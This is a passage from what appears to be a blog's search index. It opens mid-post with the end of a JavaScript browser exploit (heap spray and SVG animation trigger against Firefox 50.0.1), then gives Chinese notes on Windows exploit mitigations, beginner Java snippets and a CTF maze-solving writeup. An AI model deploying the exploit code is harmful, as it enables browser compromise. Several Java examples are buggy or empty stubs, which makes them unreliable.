&#x27;http://www.w3.org/2000/svg&#x27;;var heap80 = new Array(0x1000);var heap100 = new Array(0x4000);var block80 = new ArrayBuffer(0x80);var block100 = new ArrayBuffer(0x100);var sprayBase = undefined;var arrBase = undefined;var animateX = undefined;var containerA = undefined;var offset = 0x88 // Firefox 50.0.1var exploit = function()&#123;    var u32 = new Uint32Array(block80)    u32[0x4] = arrBase - offset;    u32[0xa] = arrBase - offset;    u32[0x10] = arrBase - offset;    for(i = heap100.length/2; i &lt; heap100.length; i++)    &#123;      heap100[i] = block100.slice(0)    &#125;    for(i = 0; i &lt; heap80.length/2; i++)    &#123;      heap80[i] = block80.slice(0)    &#125;    animateX.setAttribute(&#x27;begin&#x27;, &#x27;59s&#x27;)    animateX.setAttribute(&#x27;begin&#x27;, &#x27;58s&#x27;)    for(i = heap80.length/2; i &lt; heap80.length; i++)    &#123;      heap80[i] = block80.slice(0)    &#125;    for(i = heap100.length/2; i &lt; heap100.length; i++)    &#123;      heap100[i] = block100.slice(0)    &#125;    animateX.setAttribute(&#x27;begin&#x27;, &#x27;10s&#x27;)    animateX.setAttribute(&#x27;begin&#x27;, &#x27;9s&#x27;)    containerA.pauseAnimations();&#125;worker.onmessage = function(e) &#123;arrBase=object_target_address; exploit()&#125;//worker.onmessage = function(e) &#123;arrBase=0x30300000; exploit()&#125;var trigger = function()&#123;    containerA = document.createElementNS(svgns, &#x27;svg&#x27;)    var containerB = document.createElementNS(svgns, &#x27;svg&#x27;);    animateX = document.createElementNS(svgns, &#x27;animate&#x27;)    var animateA = document.createElementNS(svgns, &#x27;animate&#x27;)    var animateB = document.createElementNS(svgns, &#x27;animate&#x27;)    var animateC = document.createElementNS(svgns, &#x27;animate&#x27;)    var idA = &quot;ia&quot;;    var idC = &quot;ic&quot;;    animateA.setAttribute(&#x27;id&#x27;, idA);    animateA.setAttribute(&#x27;end&#x27;, &#x27;50s&#x27;);    animateB.setAttribute(&#x27;begin&#x27;, &#x27;60s&#x27;);    animateB.setAttribute(&#x27;end&#x27;, idC + &#x27;.end&#x27;);    animateC.setAttribute(&#x27;id&#x27;, idC);    animateC.setAttribute(&#x27;end&#x27;, idA + &#x27;.end&#x27;);    containerA.appendChild(animateX)    containerA.appendChild(animateA)    containerA.appendChild(animateB)    containerB.appendChild(animateC)    document.body.appendChild(containerA);    document.body.appendChild(containerB);&#125;window.onload = trigger;setInterval(&quot;window.location.reload()&quot;, 3000)/* &lt;----- */&lt;/script&gt; \n","categories":["security"],"tags":["cve"]},{"title":"windows-pwn-0","url":"/2020/10/02/security/ctf/pwn/windows-pwn-0/","content":"Windows Pwn 0x00 (基本知识)函数调用约定​\t_cdecl\n​\t_stdcall\n​\t_fastcall\n保护相关保护的开启都依赖于编译器的编译方式, 不同的编译器, 开启的程序保护机制也有所不同.\nASLRASLR保护指的是地址随机化技术(Address Space Layout Randomization)，这项技术将在程序启动时将DLL随机的加载到内存中的位置，这将缓解恶意程序的加载。ASLR技术自Windows 10开始已经在系统中被配置为默认启用,。\nHigh Entropy VA这个保护被称为高熵64位地址空间布局随机化，一旦开启，表示此程序的地址随机化的取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址。\nForce Integrity这个保护被称为强制签名保护，表示此程序加载时需要验证其中的签名，如果签名不正确，程序将会被阻止运行。\nIsolation隔离保护, 开启之后, 表示此 程序加载时需要验证其中的签名,如果签名不正确,此程序会被阻止运行\nNX/DEP/PAENX保护指的是内存页不可执行, 这项技术是一项系统级别内存保护的功能， 使得操作系统能够将一页或多页内存标记为不可执行，防止被标记为不可执行的内存页的代码不可执行。\nDEP:(Data Execution Prevention)\nPAE:(Physical Address Extension)\nSEHOP结构化异常处理保护(Structured Exception Handling Overwrite Protection), 这能够防止攻击者利用结构化异常处理来进一步利用。\nCFG控制流保护(Control Flow Guard), 这项技术通过间接跳转前插入校验代码，检查目标的有效性，进而可以阻止执行流跳转到预期之外的地点。\nRFG类似于linux 的cannary保护, 返回地址保护(Return Flow Guard),这项技术在每个函数头部将返回地址保存到fs:[rsp] (Thread Control), 并在函数返回前将其与返回地址进行比较。\nSafeSEH安全结构化异常处理(Safe Structured Exception Handlers)，事先为你定义一些异常处理函数， 并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表 之外的异常处理都会被阻止运行\nGS也类似于linux中的cannary保护, 在返回地址之前存放一个额外的Security Cookie,然后在ret之前与取出该值与之前存放的值做比较\nAuthenticode签名保护\n.NETDLL混淆\n","categories":["ctf"],"tags":["pwn"]},{"title":"Java基础","url":"/2020/09/27/dev/language/java/java/","content":"Java基础简单的输入输出import java.util.Scanner;public class HelloWorld &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;Hello you guys!&quot;);        System.out.println(&quot;I&#x27;m I0gan! 2020-05-05&quot;);        Scanner scanner = new Scanner(System.in);        String name = scanner.nextLine();        System.out.println(&quot;Your name is: &quot; + name);    &#125;&#125;\n\n\n\nif elseimport java.util.Scanner;public class Main &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;Enter an integer:&quot;);        Scanner in = new Scanner(System.in);        int n = in.nextInt();        if (n % 5 == 0 &amp;&amp; n % 6 == 0) &#123;            System.out.println(n + &quot; is divisible by both 5 and 6&quot;);        &#125; else if (n % 6 == 0 || n % 5 == 0) &#123;            System.out.println(n + &quot; is divisible by 5 or 6, but not both&quot;);        &#125; else &#123;            System.out.println(n + &quot; is not divisible by either 5 or 6&quot;);        &#125;    &#125;&#125;\n\n简单的递归计算阶层import java.util.Scanner;/*这是一个计算阶层的一个比较功能的class,比较递归方式与普通循环的方式计算效率*/public class P3 &#123;    public static void main(String[] args) &#123;        System.out.print(&quot;Plz input a num:&quot;);        Scanner s = new Scanner(System.in);        int num = s.nextInt(); //获取输入为Int类型        //以递归方式进行运算        long t1 = System.currentTimeMillis();        System.out.println(&quot;Result: &quot; + factorialLoop1(num));        long t2 = System.currentTimeMillis();        System.out.printf(&quot;递归耗时: %s %n&quot;, t2 - t1);        //以循环方式进行运算        t1 = System.currentTimeMillis();        System.out.println(&quot;Result: &quot; + factorialLoop2(num));        t2 = System.currentTimeMillis();        System.out.printf(&quot;普通耗时: %s %n&quot;, t2 - t1);    &#125;    //采用递归方式进行运算    static int factorialLoop1(int num) &#123; //采用递归方式实现阶层运算        if(num == 1) &#123;            return 1;        &#125;        return num * factorialLoop1(num - 1);    &#125;    //采用循环方式进行运算    static int factorialLoop2(int num) &#123;        long result = 1;        while(num &gt; 1) &#123;            result *= num * (num - 1);            num -= 2;        &#125;        return num;    &#125;&#125;\n\n\n\n类的基本用法// 类的基本用法 1public class MyClass &#123;    int id;    String name;    int age;    MyClass() &#123;        id = 0;        name = &quot;none&quot;;        age = 0;    &#125;    MyClass(int id, String name, int age) &#123;        this.id = id;        this.name = name;        this.age = age;    &#125;    static &#123; //在初始化类的时候,就先执行静态块,然后才能执行构造函数.        System.out.println(&quot;Class init...&quot;);    &#125;    public static void main(String[] args) &#123;        MyClass stu = new MyClass();        stu.id = 0;        stu.age = 17;        stu.name = &quot;老李&quot;;        MyClass stu2 = new MyClass(1, &quot;小二&quot;, 18);        System.out.printf(&quot;id: %d name: %s age: %d\\n&quot;, stu.id, stu.name, stu.age);        System.out.printf(&quot;id: %d name: %s age: %d\\n&quot;, stu2.id, stu2.name, stu2.age);    &#125;&#125;\n\n\n\n包的简单使用MyPack&#x2F;Package.java\npackage MyPack;import pac1.HelloPack; //也可以采用: import pac1.* ,表示导入所有包//导入包的可能会出现重名. 采用次方法: java.util.Date date = new java.util.Date(); 来指明import java.util.Date;import java.sql.*; ///*在以后写项目的时候就一定要加包* 包名命名规范: 域名倒着写, 再加上模块名, 便于管理内部管理类* 例如: com.sun.test* cn.sxt.gao.view.model* java常用包:* java.lang //核心类* java.awt //用于图形界面* java.net //网络相关* java.io //输入输出* java..util //工具类** 技巧:* 按住 Ctrl + 鼠标点击左键即可进入某个类中.* *///导入Math下的所有静态属性import java.lang.Math.*;public class Package &#123;    public static void main(String[] args) &#123;        //此方法不用声明 import pac1.HelloPack;        pac1.HelloPack p1 = new pac1.HelloPack(2, &quot;I0gan&quot;);        p1.print();        //此方法需要: import pac1.HelloPack;        HelloPack p2 = new HelloPack(3, &quot;Mike&quot;);        p2.print();        //不同包下类重名解决办法:        java.util.Date date = new java.util.Date();        java.sql.Date date2 = new java.sql.Date(1);    &#125;&#125;\n\npac1&#x2F;HelloPack.java\npackage pac1;public class HelloPack &#123;    int id;    String name;    public HelloPack(int id, String name) &#123;        this.id = id;        this.name = name;    &#125;    public void print() &#123;        System.out.printf(&quot;id: %d name: %s \\n&quot;, id, name);    &#125;&#125;\n\n\n\n类的继承package xyz.lyxf;class Person &#123;    //注意变量默认为public    private int nouse;    protected String name; //保护形式    public int age;    public void rest() &#123;        System.out.println(&quot;I wanna a rest!&quot;);    &#125;&#125;class Student extends Person &#123; //继承Person    String major;    public void study() &#123;        System.out.println(&quot;I wanna study ten hours!&quot;);    &#125;&#125;public class MyClass &#123;    public static void main(String[] args) &#123;        Student std = new Student();        std.age = 16;        std.name = &quot;I0gan&quot;;        std.major = &quot;English&quot;;        // std.nouse = 1; //不能使用        std.study();        std.rest();        //instanceof 关键字: 判断某个对象是不是属于某个Class        System.out.println( std instanceof  Student);        System.out.println( std instanceof  Person);        System.out.println( new Person() instanceof  Student);    &#125;&#125;\n\n\n\noverwrite重写package xyz.lyxf;/** * 方法重写 * &quot;==&quot;: 方法名, 形参列表相同 * &quot;&lt;=&quot; 返回值类型和声明异常类型,子类小于等于父类 * &quot;&gt;=&quot; 访问权限,子类大于等于父类 */class Person &#123;    String name;&#125;class Student extends Person &#123;    String marjor;&#125;class Vehicle &#123;    public void run() &#123;        System.out.println(&quot;run&quot;);    &#125;    public void stop() &#123;        System.out.println(&quot;stop&quot;);    &#125;    public Person WhoDrivevehicle() &#123;        return new Person();    &#125;&#125;class Horse extends Vehicle &#123;    public void run()  &#123; //重写父类run函数.        System.out.println(&quot;四蹄翻飞&quot;);    &#125;    //重写的返回参数大于基类, Student &gt; person    public Student WhoDrivevehicle() &#123;        return new Student();    &#125;&#125;public class MyClass &#123;    public static void main(String[] args) &#123;        Horse h = new Horse();        h.run();        h.stop();        Student s = h.WhoDrivevehicle();        s.marjor = &quot;开马车..&quot;;    &#125;&#125;\n\n\n\n重写toStringpackage xyz.lyxf;import java.lang.Object;/** toString()** */class Obj &#123;&#125;class Obj2 &#123;    public String toString() &#123; //重写toString        return &quot;My String&quot;;    &#125;&#125;public class MyObject &#123;    public static void main(String[] args) &#123;        MyObject obj = new MyObject();        //public String toString() &#123;        //        return getClass().getName() + &quot;@&quot; + Integer.toHexString(hashCode());        //&#125;        System.out.println(obj.toString()); //toString是Object中的一个函数        System.out.println(new Obj());        System.out.println(new Obj2()); //重写后的toString    &#125;&#125;\n\n\n\n重写equalspackage MyObj;import java.util.Objects;/* * 重写==函数 (equal) *public boolean equals(Object obj) &#123; *       return (this == obj); //默认采用判断地址是否相等来判断对象是否相等 * &#125; * * */public class MyObj &#123;    public static void main(String[] args) &#123;        Object obj;        String str;        User u1 = new User(1, &quot;老王&quot;, &quot;123456&quot;);        User u2 = new User(1, &quot;老王&quot;, &quot;123456&quot;);        System.out.println(u1 == u2);        System.out.println(u1.equals(u2));    &#125;&#125;class User &#123;    int id;    String name;    String pwd;    public User(int id, String name, String pwd) &#123;        super();        this.id = id;        this.name = name;        this.pwd = pwd;    &#125;    //@Override    public boolean equals(Object obj) &#123;        System.out.println(&quot;equals调用&quot;);        if(this == obj) &#123;            return true;        &#125;        if(obj == null) &#123;            return false;        &#125;        if(getClass() != obj.getClass()) &#123;            return false;        &#125;        User other = (User)obj;        if(this.id == other.id) &#123;            return true;        &#125;        return true;    &#125;    @Override    public int hashCode() &#123;        return Objects.hash(id, name, pwd);    &#125;&#125;\n\n\n\n访问权限Human.java\npublic class Human &#123;    public String name;    private int age;    protected int rev;    //外部类采用set get来操作private成员    public void setAge(int age) &#123;        if(age &lt; 4) &#123;            age = 4;        &#125;        this.age = age;    &#125;    public int getAge() &#123;        return this.age;    &#125;&#125;\n\nTestEncapsulation.java\n/**           同一个类     同一个包     子类      所有类* private:     ** default:     *          ** protected:   *          *         ** public:      *          *         *         *** 外部类采用set get来操作private成员** */public class TestEncapsulation &#123;    public static void main(String[] args) &#123;        Boy b = new Boy();        b.sayHello();        b.setAge(2);        System.out.println(b.getAge());    &#125;&#125;class Boy extends Human &#123;    void sayHello () &#123;        System.out.println(name);        System.out.println(rev);    &#125;&#125;\n\n\n\nsuper关键字package lyxf.xyz;class Father &#123;    public int value;    public Father() &#123;        System.out.println(&quot;create father class&quot;);    &#125;    public void fun() &#123;        value = 100;        System.out.println(&quot;Father class: &quot; + value);    &#125;    &#123;        System.out.println(&quot;Fahter static code&quot;);    &#125;&#125;class Child extends Father&#123;    public int value;    public Child() &#123;        super(); //默认调用父类构造器, 没写编译器自动加入        System.out.println(&quot;create child class&quot;);    &#125;    public void fun() &#123;        super.fun(); //调用父类函数        value = 200; //没有对父类进行覆盖        System.out.println(&quot;Child class: &quot; + value + &quot;Father value: &quot; + super.value);    &#125;    &#123;        System.out.println(&quot;Child static code&quot;);    &#125;&#125;public class Super &#123;    public static void main(String[] args) &#123;        Child c = new Child();        c.fun();    &#125;&#125;\n\n\n\n多态/** * 多态: 一个基类可以管理子类的重写函数 */public class Polymorphism &#123;    public static void main(String[] args) &#123;        Dog d = new Dog();        Cat c = new Cat();        animalShout(d);        animalShout(c);    &#125;    static void animalShout(Animal a) &#123;        a.shout();    &#125;&#125;class Animal &#123;    public void shout() &#123;        System.out.println(&quot;叫了一声&quot;);    &#125;&#125;class Dog extends Animal &#123;    public void shout() &#123;        System.out.println(&quot;狗叫了&quot;);    &#125;&#125;class Cat extends  Animal &#123;    public void shout() &#123;        System.out.println(&quot;猫叫了&quot;);    &#125;&#125;\n\n\n\n多态相关的类型转换 &amp;&amp; finalpublic class Casting &#123;    public static void main(String[] args) &#123;        Animal d = new Dog(); //自动向上转型        d.shout();        Dog d2 = (Dog)d; //强制转回来        d2.run();        Cat cat = (Cat)d;        //cat.eat(); //不能调用    &#125;&#125;class Animal &#123;    public void shout() &#123;        System.out.println(&quot;叫了&quot;);    &#125;&#125;class Dog  extends  Animal &#123;    int age;    public void shout() &#123;        System.out.println(&quot;狗叫了&quot;);    &#125;    public void run() &#123;        System.out.println(&quot;狗跑了&quot;);    &#125;&#125;class Cat extends  Animal &#123;    public void eat() &#123;        System.out.println(&quot;猫吃东西&quot;);    &#125;&#125;final class TestFinal &#123;   //final 修饰类:  该类不能被继承    final int a = 0;      //final 修饰变量: 变量只能被赋值一次    final void study() &#123;  //final 修饰函数: 该函数不能被子类重写    &#125;&#125;\n\n\n\n数组与遍历/** 数组三个基本特点:* 长度是确定的* 元素类型相同* 数组类型任意* 数组就是对象* 声明方式:* 1: type[] arr_name; (推荐)* 2: type arr_name[];* */public class Arr &#123;    public static void main(String[] args) &#123;        int[] arr1;        String[] arr2 = new  String[3];        User[] arr3 = null;  //声明        arr3 = new User[10]; //分配空间,并没有创建10个对象        arr2[0] = &quot;老李&quot;;        arr2[1] = &quot;老王&quot;;        arr2[2] = &quot;老狗&quot;;        for(int i = 0; i &lt; arr2.length; ++i) &#123;            System.out.println(arr2[i]);        &#125;        //遍历方法二        for (String i: arr2) &#123;            System.out.println(i);        &#125;        for(int i = 0; i &lt; arr3.length; ++i) &#123;            arr3[i] = new User();            arr3[i].setAge(i);        &#125;        for (User u: arr3             ) &#123;            System.out.println(u.getAge());        &#125;    &#125;&#125;class User &#123;    private int age;    private int name;    public User () &#123;        System.out.println(&quot;创建User&quot;);    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;\n\n\n\n数组的初始化方式public class Array &#123;    public static void main(String[] args) &#123;        //静态初始化        int[] a = &#123;1, 2, 4 ,5&#125;;        User[] b = &#123;new User(1), new User(2), new User(3)&#125;;        //动态初始化        int[] c = new int[4];        c[0] = 1;        c[2] = 0;        //默认初始化        int d[] = new int[2]; //默认值为0        boolean[] e = new boolean[3]; // 默认值为false        String[] s = new String[2];   //默认值为null        User[] u = new User[4]; //默认值为null        for(int i = 0; i &lt; u.length; ++i) &#123;            u[i] = new User(i);        &#125;        //不能对对象进行真正的赋值        for (User i: u) &#123;            System.out.println(i.getId());        &#125;    &#125;&#125;class User &#123;    int id;    User(int id) &#123;        this.id = id;    &#125;    int getId() &#123;        return this.id;    &#125;&#125;\n\n三角角度计算import java.util.Scanner;import java.lang.*;public class Main&#123;    public static class Triangle&#123;        double x1,y1,x2,y2,x3,y3;        double a_length,b_length,c_length,average;        double a_angle, b_angle, c_angle;        public void cal_len()&#123;            a_length = Math.sqrt(Math.pow((x2 - x3),2) + Math.pow((y2-y3),2));            b_length = Math.sqrt(Math.pow((x1 - x3),2) + Math.pow((y1-y3),2));            c_length = Math.sqrt(Math.pow((x1 - x2),2) + Math.pow((y1-y2),2));        &#125;        public void cal_angel()&#123;            a_angle=Math.toDegrees(Math.acos((Math.pow(a_length, 2) - Math.pow(b_length, 2)- Math.pow(c_length, 2))/(-2 * b_length * c_length)));            b_angle=Math.toDegrees(Math.acos((Math.pow(b_length, 2) - Math.pow(a_length, 2)- Math.pow(c_length, 2))/(-2 * a_length * c_length)));            c_angle=Math.toDegrees(Math.acos((Math.pow(c_length, 2) - Math.pow(b_length, 2)- Math.pow(a_length, 2))/(-2 * b_length * a_length)));        &#125;    &#125;    public static void main(String[] args)    &#123;        Scanner sc = new Scanner(System.in);        Triangle first = new Triangle();        System.out.println(&quot;输入三角形顶点A的坐标: &quot;);        first.x1 = sc.nextDouble();        first.y1 = sc.nextDouble();        System.out.println(&quot;输入三角形顶点B的坐标: &quot;);        first.x2 = sc.nextDouble();        first.y2 = sc.nextDouble();1        System.out.println(&quot;输入三角形顶点C的坐标: &quot;);        first.x3 = sc.nextDouble();        first.y3 = sc.nextDouble();        first.cal_len();        first.cal_angel();        System.out.printf(&quot;角A的角度为%.2f\\n&quot; , first.a_angle);        System.out.printf(&quot;角B的角度为%.2f\\n&quot; , first.b_angle);        System.out.printf(&quot;角C的角度为%.2f\\n&quot; , first.c_angle);    &#125;&#125;\n\n\n\n\n\n排序bubuleimport java.util.ArrayList;public class bubule &#123;\tpublic static int size_ = 10;\tpublic static int[] sort(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i) &#123;\t\t\tfor(int j = 0; j &lt; (arr.length - i); ++j) &#123;\t\t\t\tif(arr[i] &lt; arr[j]) &#123;\t\t\t\t\tarr[i] += arr[j];\t\t\t\t\tarr[j] = arr[i] - arr[j];\t\t\t\t\tarr[i] = arr[i] - arr[j];\t\t\t\t&#125;\t\t\t&#125;\t\t\t&#125;\t\t\treturn arr;\t&#125;\tpublic static void print(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i)\t\t\tSystem.out.print(arr[i] + &quot; &quot;);\t\tSystem.out.println();\t&#125;\tpublic static void main(String[] args) &#123;\t\tint[] arr1 = new int[size_];\t\tint[] arr2 = null;\t\tfor(int i = 0; i &lt; size_; ++i)\t\t\tarr1[i] = (int)(100 +Math.random() * (100 + 1));\t\tSystem.out.println(&quot;before order:&quot;);\t\tprint(arr1);\t\t\t\t\tarr2 = sort(arr1);\t\tSystem.out.println(&quot;after order:&quot;);\t\tprint(arr2);\t&#125;&#125;;\n\n\n\ninsertpublic class insert &#123;\tpublic static int size_ = 10;\tpublic static int[] sort(int[] arr) &#123;\t\tfor(int i = 1; i &lt; arr.length; ++i) &#123;\t\t\tint t = arr[i];\t// unorder arr\t\t\tint j;\t\t\t// move arr to back\t\t\tfor(j = i - 1; j &gt;= 0 &amp;&amp; t &lt; arr[j]; j--)\t\t\t\tarr[j + 1] = arr[j];\t\t\tarr[j + 1] = t;\t\t&#125;\t\treturn arr;\t&#125;\tpublic static void print(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i)\t\t\t\tSystem.out.print(arr[i] + &quot; &quot;);\t\tSystem.out.println();\t&#125;\tpublic static void main(String[] args) &#123;\t\tint[] arr1 = new int[size_];\t\t\t\t\tint[] arr2 = null;\t\tfor(int i = 0; i &lt; arr1.length; ++i)\t\t\tarr1[i] = (int)(Math.random() * (100 + 1));\t\tSystem.out.println(&quot;before sort&quot;);\t\tprint(arr1);\t\tarr2 = sort(arr1);\t\tSystem.out.println(&quot;after sort&quot;);\t\tprint(arr2);\t&#125;&#125;;\n\nselectpublic class select &#123;\tpublic static int size_ = 10;\tpublic static int[] sort(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i) &#123;\t\t\tint min_p = i;\t\t\tfor(int j = i; j &lt; arr.length; ++j) &#123;\t\t\t\tif(arr[min_p] &gt; arr[j]) &#123;\t\t\t\t\tmin_p = j;\t\t\t\t&#125;\t\t\t&#125;\t\t\t//如果是最小是自己, 不用交换\t\t\tif(i == min_p) \t\t\t\tcontinue;\t\t\tarr[i] += arr[min_p];\t\t\tarr[min_p] = arr[i] - arr[min_p];\t\t\tarr[i] = arr[i] - arr[min_p];\t\t&#125;\t\treturn arr;\t\t&#125;\tpublic static void print(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i)\t\t\t\tSystem.out.print(arr[i] + &quot; &quot;);\t\tSystem.out.println();\t&#125;\tpublic static void main(String[] args) &#123;\t\tint[] arr1 = new int[size_];\t\t\t\t\tint[] arr2 = null;\t\tfor(int i = 0; i &lt; arr1.length; ++i)\t\t\tarr1[i] = (int)(Math.random() * (100 + 1));\t\tSystem.out.println(&quot;before sort&quot;);\t\tprint(arr1);\t\tarr2 = sort(arr1);\t\tSystem.out.println(&quot;after sort&quot;);\t\tprint(arr2);\t&#125;&#125;;\n\nquickpublic class shell &#123;\tpublic static int size_ = 10;\tpublic static int[] sort(int[] arr) &#123;\t\t \t\treturn arr;\t&#125;\tpublic static void print(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i)\t\t\t\tSystem.out.print(arr[i] + &quot; &quot;);\t\tSystem.out.println();\t&#125;\tpublic static void main(String[] args) &#123;\t\tint[] arr1 = new int[size_];\t\tint[] arr2 = null;\t\tfor(int i = 0; i &lt; arr1.length; ++i)\t\t\tarr1[i] = (int)(Math.random() * (100 + 1));\t\tSystem.out.println(&quot;before sort&quot;);\t\tprint(arr1);\t\tarr2 = sort(arr1);\t\tSystem.out.println(&quot;after sort&quot;);\t\tprint(arr2);\t&#125;&#125;;\n\n\n\nshellpublic class shell &#123;\tpublic static int size_ = 10;\tpublic static int[] sort(int[] arr) &#123;\t\t \t\treturn arr;\t&#125;\tpublic static void print(int[] arr) &#123;\t\tfor(int i = 0; i &lt; arr.length; ++i)\t\t\t\tSystem.out.print(arr[i] + &quot; &quot;);\t\tSystem.out.println();\t&#125;\tpublic static void main(String[] args) &#123;\t\tint[] arr1 = new int[size_];\t\tint[] arr2 = null;\t\tfor(int i = 0; i &lt; arr1.length; ++i)\t\t\tarr1[i] = (int)(Math.random() * (100 + 1));\t\tSystem.out.println(&quot;before sort&quot;);\t\tprint(arr1);\t\tarr2 = sort(arr1);\t\tSystem.out.println(&quot;after sort&quot;);\t\tprint(arr2);\t&#125;&#125;;\n\n","categories":["language"],"tags":["java"]},{"title":"极客巅峰2020","url":"/2020/09/26/security/ctf/compitation/wp-jk-2020/","content":"极客巅峰 2020本来都可以进线下的, 但我二进制这边没有输出, 先来个中午时web历史辉煌一刻:\n\n只怪自己太菜, 连累了队伍, 最后掉到后40了….\nPWN这次比赛两个盲打, 一个blind heap另一个不知道是啥题, 类似与抓的awd抓的流量包…还有一个是python 的溢出利用这次的pwn只有个bheap有点思路, 其他两个pwn完全没思路, 但是一个也没弄出来, (菜~)。\nbheap​\tbheap存在uaf漏洞, double free之后没有报错, 那可以猜想为libc.so.2.26 ~ libc.so.2.27, 且在本地写了个模拟了一个逻辑差不多的程序, 使用dup修改top chunk size 故意报错, 远程也是如此，也很肯定猜想是正确的. 比较麻烦的是如何泄漏libc, 且开辟的次数不能超过10次。若用dup打入IO_FILE泄漏Libc的话, 开辟次数非常多, 加上再次劫持mallo_hook或free_hook,次数就超过10次很多了, 这点问题就把我kill掉了….菜~等wp吧….\nREvirus是一个简单的迷宫题.采用4个迷宫, 需要自己根据字符串长度调整迷宫顺序.\n主逻辑代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  int v5; // [esp+14h] [ebp-4Ch]  int v6; // [esp+3Ch] [ebp-24h]  int v7; // [esp+40h] [ebp-20h]  int v8; // [esp+44h] [ebp-1Ch]  int v9; // [esp+48h] [ebp-18h]  int v10; // [esp+4Ch] [ebp-14h]  size_t v11; // [esp+50h] [ebp-10h]  int len; // [esp+54h] [ebp-Ch]  int i; // [esp+58h] [ebp-8h]  int times; // [esp+5Ch] [ebp-4h]  __main();  puts(&quot;There is a long way to defeat it.&quot;);  scanf(&quot;%s&quot;, flag);  len = strlen(flag);  v6 = 0;  v7 = 0;  v8 = 0;  v9 = 0;  v10 = 0;  times = 0;  v11 = 0;  for ( i = 0; i &lt; len; ++i )  &#123;    if ( flag[i] == &#x27;-&#x27; )    &#123;      v3 = times++;      *(&amp;v6 + v3) = i;                          // length    &#125;    if ( !times )    &#123;      *(&amp;v5 + i) = flag[i] - &#x27;0&#x27;;               // check is number      if ( *(&amp;v5 + i) &gt; 9 || *(&amp;v5 + i) &lt; 0 )        return 0;    &#125;  &#125;  if ( times != 4 )                             // 4    return 0;  v10 = len;  for ( i = 1; i &lt;= times; ++i )  &#123;    v11 = *(&amp;v6 + i) - *(&amp;v6 + i - 1) - 1;    if ( step[i] != v11 )                       // check length      return 0;    strncpy(&amp;road[0xC8 * i], &amp;flag[*(&amp;v6 + i - 1) + 1], v11);  &#125;  for ( i = 0; i &lt;= 3; ++i )  &#123;    if ( check_flag((int)&amp;global_map + 0xC8 * *(&amp;v5 + i), *(&amp;v5 + i), &amp;road[200 * (i + 1)]) )    &#123;      puts(&quot;How about try again?&quot;);      return 0;    &#125;    if ( i == 3 )      printf(&quot;Great! We will defeat it!!! your flag is flag&#123;%s&#125;&quot;, flag);  &#125;  return 0;&#125;\n\n解释一下, 要求输入四个’-‘, 在输入’-‘之前必须为数字, 然后在对字符串的进行’-‘分割, ‘-’后面的长度分别为: 19, 25, 26, 28.这个从step[i] != v11所判断的, 如下:\n.data:00403468 _step           dd 0                    ; DATA XREF: _main+13F↑r.data:0040346C                 dd 19.data:00403470                 dd 25.data:00403474                 dd 26.data:00403478                 dd 28.data:0040347C                 db    0.data:0040347D                 db    0.data:0040347E                 db    0.data:0040347F                 db    0\n\n通过以上逻辑, 输入的格式必须满足  -str1-str2-str3-str4\n接着看check_flag函数:\nbool __cdecl check_flag(int a1, int a2, char *a3)&#123;  bool result; // eax  signed int length; // [esp+10h] [ebp-18h]  int width; // [esp+14h] [ebp-14h]  int hight; // [esp+18h] [ebp-10h]  signed int i; // [esp+1Ch] [ebp-Ch]  length = strlen(a3);  hight = start[2 * a2];  width = dword_403444[2 * a2];  for ( i = 0; ; ++i )  &#123;    result = i;    if ( i &gt;= length )      break;    switch ( a3[i] )    &#123;      case &#x27;w&#x27;:        --hight;        break;      case &#x27;s&#x27;:        ++hight;        break;      case &#x27;a&#x27;:        --width;        break;      case &#x27;d&#x27;:        ++width;        break;      default:        return 1;    &#125;    if ( width &lt; 0 || width &gt; 19 || hight &lt; 0 || hight &gt; 10 ) //迷宫宽度 20, 高度10      return 1;    if ( length - 1 == i )      return *(_BYTE *)(a1 + 20 * hight + width) != &#x27;d&#x27;;    if ( *(_BYTE *)(a1 + 20 * hight + width) != &#x27;.&#x27; )      return 1;  &#125;  return result;&#125;\n\n就是一个典型的迷宫了,使用wsad字符来控制.\n那么我们所输入的就需要这四个字符来控制了, 先找一下迷宫的地图, 且进行宽度为20进行补齐如下:\n|||||||||||||||.....|||||||||||||||.....|||||||||||||||.....||s.........|||.....|||||||||||.|||.....||d||||||||.|||.....||.||||||||.|||.....||.||||||||.|||.....||..........|||.....|||||||||||||||.....|||||||||||||||||||.||s|||||||||||||d||.||..|||||||||||..||.|||..|||||||||..|||.||||..|||||||..||||.|||||..|||||..|||||.||||||..|||..||||||.|||||||..|..|||||||.||||||||...||||||||.|||||||||||||||||||.|||||||||||||||.....||.........s|||.....||.||||||||||||.....||.||||||||||||.....||.||||||||||||.....||.||||||||||||.....||.||||||||||||.....||.||||||||||||.....||.........d|||.....|||||||||||||||.....|||||||||||||||.....|||||||||||||||.....|||||||||||||||.....|||..........||.....|||.||||||||.||.....|||.||||||||.||.....|||.||||||||.||.....|||.||||||||.||.....|||s||||||||d||.....|||||||||||||||.....\n\n从s出发到d结束, 那么四个迷宫分别步骤如下:\ndddddddddsssssaaaaaaaaawww \nsdsdsdsdsdsdsddwdwdwdwdwdwdw\naaaaaaaaasssssssddddddddd \nwwwwwdddddddddsssss\n当我输入 -dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw-aaaaaaaaasssssssddddddddd-wwwwwdddddddddsssss发现, 在调用check_flag传入map参数执偏离原map很大的一个地址,且进入check_flag函数获取map中的值都是0,原来在输入步骤之前需要指定地图的顺序.\n根据前面我们知道每个字符串的长度(19, 25, 26, 